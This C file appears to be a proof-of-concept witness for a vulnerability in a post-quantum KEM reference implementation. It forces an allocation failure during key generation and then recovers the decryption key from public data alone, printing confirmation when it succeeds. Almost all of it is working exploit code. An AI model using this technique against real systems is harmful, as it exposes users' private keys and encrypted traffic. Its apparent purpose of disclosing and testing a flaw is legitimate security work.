/* ZEN: a real allocation failure can leave a publicly recoverable key.
 * Build with the frozen reference sources and -O2; no allocator interposition.
 * The stack-residue route is build dependent, so this is a witness, not a
 * claim that every build or every low-memory key generation is vulnerable.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/resource.h>
#include <sys/time.h>

#include "KEM_AlgorithmInstance.h"
#include "drng.h"
#include "params.h"
#include "pke.h"
#include "poly.h"
#include "sample.h"
#include "ntt.h"
#include "auxfunc.h"

DRNG_ctx drng_algorithm;
static void *held[800000];

#if defined(ZEN_TIER_128)
#define TIER_LABEL "ZEN-128"
#define SAMPLE_BYTES (2 * ZEN_N_LEN_BYTES)
static void sample_f(int16_t *f, const uint8_t *p) { cbd1(f, p); }
static void hash_pk(const unsigned char *pk, unsigned char *out) {
    sm3hash(2 * ZEN_SYM_LEN_BYTES * 8, pk, ZEN_PUBLICKEY_LEN_BYTES * 8, out);
}
#elif defined(ZEN_TIER_256)
#define TIER_LABEL "ZEN-256"
#define SAMPLE_BYTES (3 * ZEN_N_LEN_BYTES)
static void sample_f(int16_t *f, const uint8_t *p) { tenary1_8(f, p); }
static void hash_pk(const unsigned char *pk, unsigned char *out) {
    sm3hash(ZEN_SYM_LEN_BYTES * 8, pk, ZEN_PUBLICKEY_LEN_BYTES * 8, out);
}
#elif defined(ZEN_TIER_512)
#define TIER_LABEL "ZEN-512"
#define SAMPLE_BYTES (5 * ZEN_N_LEN_BYTES)
static void sample_f(int16_t *f, const uint8_t *p) { tenary3_32(f, p); }
static void hash_pk(const unsigned char *pk, unsigned char *out) {
    pseudohash(ZEN_SYM_LEN_BYTES * 8, pk, ZEN_PUBLICKEY_LEN_BYTES * 8, out);
}
#else
#error Compile with ZEN_TIER_128, ZEN_TIER_256 or ZEN_TIER_512
#endif

static void timed_out(int signal_number) {
    (void)signal_number;
    _Exit(77);
}

static unsigned public_candidates(const unsigned char *anchor,
                                  const unsigned char *target,
                                  const unsigned char *ct,
                                  unsigned long long ct_len,
                                  const unsigned char *sender_ss,
                                  unsigned long long ss_len,
                                  const unsigned char *victim_sk,
                                  unsigned *equivalent) {
    int16_t anchor_h[ZEN_N], target_h[ZEN_N], f[ZEN_N], g[ZEN_N];
    int16_t t[ZEN_N4], f2[ZEN_N4];
    unsigned char candidate[ZEN_SECREKEY_LEN_BYTES];
    unsigned char ss[ZEN_SHAREDKEY_LEN_BYTES];
    unsigned long long got_len;
    unsigned count = 0;
    *equivalent = 0;
    poly_publickey_unpack(anchor_h, anchor);
    poly_publickey_unpack(target_h, target);
    for (unsigned offset = 0; offset + SAMPLE_BYTES <= sizeof anchor_h;
         ++offset) {
        sample_f(f, (const uint8_t *)anchor_h + offset);
        for (unsigned j = 0; j < ZEN_N4; ++j)
            t[j] = (f[j] & 1) ^ (f[j + ZEN_N4] & 1) ^
                   (f[j + 2 * ZEN_N4] & 1) ^ (f[j + 3 * ZEN_N4] & 1);
        if (check_poly_inv_Z2(t)) continue;
        FastInversion(f2, t);
        poly_ntt_mq(f);
        poly_basemul_ntt_mq(g, target_h, f);
        poly_intt(g);

        /* In this reference code the inverse transform scales small g by 57.
         * This public relation selects candidates; the victim sk and sender
         * secret below are used only to validate the selected candidate. */
        unsigned small = 0;
        for (unsigned j = 0; j < ZEN_N; ++j) {
            int x = g[j] % ZEN_Q;
            if (x < 0) x += ZEN_Q;
            if (x > ZEN_Q / 2) x -= ZEN_Q;
            if (x % 57 == 0 && x >= -342 && x <= 342) ++small;
        }
        if (small != ZEN_N) continue;
        ++count;
        poly_secretkey_pack(candidate, f);
        poly_bit2byte_pack(candidate + ZEN_F_NTT_PACK, f2, ZEN_N4);
        memcpy(candidate + ZEN_INDCPA_SECREKEY_LEN_BYTES, target,
               ZEN_PUBLICKEY_LEN_BYTES);
        hash_pk(target, candidate + ZEN_INDCPA_SECREKEY_LEN_BYTES +
                        ZEN_PUBLICKEY_LEN_BYTES);
        memset(candidate + ZEN_INDCPA_SECREKEY_LEN_BYTES +
                   ZEN_PUBLICKEY_LEN_BYTES + ZEN_SYM_LEN_BYTES,
               0, ZEN_SHAREDKEY_LEN_BYTES);
        got_len = 0;
        if (kem_dec(candidate, ZEN_SECREKEY_LEN_BYTES,
                    (unsigned char *)ct, ct_len, ss, &got_len) == 0 &&
            got_len == ss_len && memcmp(ss, sender_ss, ss_len) == 0 &&
            memcmp(candidate, victim_sk, ZEN_INDCPA_SECREKEY_LEN_BYTES) == 0)
            ++*equivalent;
        printf("public_candidate_offset=%u decryption_secret_matches=%d "
               "fresh_decapsulation_matches=%d\n", offset,
               memcmp(candidate, victim_sk, ZEN_INDCPA_SECREKEY_LEN_BYTES) == 0,
               got_len == ss_len && memcmp(ss, sender_ss, ss_len) == 0);
    }
    return count;
}

int main(int argc, char **argv) {
    unsigned seed_byte = argc > 1 ? (unsigned)strtoul(argv[1], NULL, 0) : 4;
    unsigned char seed[64], pk0[ZEN_PUBLICKEY_LEN_BYTES];
    unsigned char sk0[ZEN_SECREKEY_LEN_BYTES];
    unsigned char pk[ZEN_PUBLICKEY_LEN_BYTES], sk[ZEN_SECREKEY_LEN_BYTES];
    unsigned char clean_pk[ZEN_PUBLICKEY_LEN_BYTES];
    unsigned char clean_sk[ZEN_SECREKEY_LEN_BYTES];
    unsigned char wrong_anchor[ZEN_PUBLICKEY_LEN_BYTES];
    unsigned char ct[ZEN_CIPHERTEXT_LEN_BYTES], ss[ZEN_SHAREDKEY_LEN_BYTES];
    unsigned char victim_ss[ZEN_SHAREDKEY_LEN_BYTES];
    unsigned char clean_ct[ZEN_CIPHERTEXT_LEN_BYTES];
    unsigned char clean_ss[ZEN_SHAREDKEY_LEN_BYTES];
    unsigned long long pk_len = 0, sk_len = 0, ct_len = 0, ss_len = 0;
    unsigned long long victim_ss_len = 0;
    unsigned long long clean_pk_len = 0, clean_sk_len = 0;
    unsigned long long clean_ct_len = 0, clean_ss_len = 0;
    unsigned char message[ZEN_INDCPA_MSG_LEN_BYTES] = {0};
    unsigned char coins[SEED_LEN_BYTES] = {0};
    struct rlimit old_limit, limit;
    struct itimerval timer = {{0, 0}, {0, 200000}};
    unsigned held_count = 0, equivalent = 0, wrong_equivalent = 0;
    unsigned clean_equivalent = 0;

    memset(seed, (unsigned char)seed_byte, sizeof seed);
    init_random_number(&drng_algorithm, seed, sizeof seed);
    if (kem_keygen(pk0, &pk_len, sk0, &sk_len) != 0) return 2;
    /* Leave a public-key-derived array on the stack before the next keygen. */
    pke_enc(pk0, message, coins, ct);
    if (getrlimit(RLIMIT_AS, &old_limit) != 0) return 2;
    limit = old_limit;
    limit.rlim_cur = 64ULL * 1024 * 1024;
    if (setrlimit(RLIMIT_AS, &limit) != 0) return 77;
    while (held_count < 800000 &&
           (held[held_count] = malloc(69)) != NULL) ++held_count;
    if (held_count == 800000) return 77;
    signal(SIGALRM, timed_out);
    setitimer(ITIMER_REAL, &timer, NULL);
    int keygen_result = kem_keygen(pk, &pk_len, sk, &sk_len);
    timer.it_value.tv_usec = 0;
    setitimer(ITIMER_REAL, &timer, NULL);
    if (setrlimit(RLIMIT_AS, &old_limit) != 0) return 2;
    for (unsigned j = 0; j < held_count; ++j) free(held[j]);
    if (keygen_result != 0) return 77;
    if (kem_enc(pk, pk_len, ss, &ss_len, ct, &ct_len) != 0) return 2;

    memset(seed, 0x43, sizeof seed);
    if (kem_keygen_derand(clean_pk, &clean_pk_len, clean_sk,
                          &clean_sk_len, seed) != 0 ||
        kem_enc(clean_pk, clean_pk_len, clean_ss, &clean_ss_len,
                clean_ct, &clean_ct_len) != 0) return 2;
    for (unsigned j = 0; j < sizeof wrong_anchor; ++j)
        wrong_anchor[j] = pk0[j] ^ 0x5a;

    unsigned found = public_candidates(pk0, pk, ct, ct_len, ss, ss_len,
                                       sk, &equivalent);
    unsigned wrong = public_candidates(wrong_anchor, pk, ct, ct_len, ss,
                                       ss_len, sk, &wrong_equivalent);
    unsigned normal = public_candidates(pk0, clean_pk, clean_ct,
                                        clean_ct_len, clean_ss, clean_ss_len,
                                        clean_sk, &clean_equivalent);
    unsigned char expected_hpk[2 * ZEN_SYM_LEN_BYTES];
    hash_pk(pk, expected_hpk);
    int stored_hpk_matches =
        memcmp(sk + ZEN_INDCPA_SECREKEY_LEN_BYTES + ZEN_PUBLICKEY_LEN_BYTES,
               expected_hpk, ZEN_SYM_LEN_BYTES) == 0;
    int victim_dec_result = kem_dec(sk, sk_len, ct, ct_len,
                                    victim_ss, &victim_ss_len);
    printf("observed_public_candidates=%u equivalent_keys=%u "
           "wrong_anchor=%u normal_key=%u stored_hpk_matches=%d "
           "victim_ss_matches=%d\n",
           found, equivalent, wrong, normal,
           stored_hpk_matches,
           victim_dec_result == 0 && victim_ss_len == ss_len &&
           memcmp(victim_ss, ss, ss_len) == 0);
    if (found && equivalent && wrong == 0 && normal == 0) {
        printf("CONFIRMED kem-41-2 %s: real allocation failure, "
               "fail-open keygen, public-data decryption-key recovery\n",
               TIER_LABEL);
        return 0;
    }
    return 77; /* This stack layout did not exhibit the public-data route. */
}
